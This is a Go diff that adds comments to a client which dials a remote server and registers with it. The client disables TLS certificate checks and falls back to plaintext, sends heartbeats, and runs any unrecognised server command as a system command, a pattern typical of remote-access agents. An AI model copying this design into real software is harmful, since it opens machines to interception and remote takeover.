@@ -56,12 +56,12 @@ func (c *ClientApp) connectToServer() error {
 	var conn net.Conn
 	var err error
 	
-
+	// Try TLS first
 	conn, err = tls.Dial("tcp", c.host+":"+c.port, &tls.Config{
 		InsecureSkipVerify: true,
 	})
 	if err != nil {
-
+		// Fallback to insecure connection
 		conn, err = net.Dial("tcp", c.host+":"+c.port)
 		if err != nil {
 			return err
@@ -74,16 +74,17 @@ func (c *ClientApp) connectToServer() error {
 	c.conn = conn
 	defer conn.Close()
 
+	// Send registration
 	if err := c.register(); err != nil {
 		return err
 	}
 
 	fmt.Println("✅ Successfully registered with server")
 
-
+	// Start heartbeat
 	go c.heartbeat()
 
-
+	// Handle commands
 	return c.handleCommands()
 }
 
@@ -190,7 +191,7 @@ func (c *ClientApp) executeCommand(command string) string {
 	case "download":
 		return "📥 File download not implemented in this version"
 	default:
-
+		// Execute system command
 		return c.executeSystemCommand(command)
 	}
 }
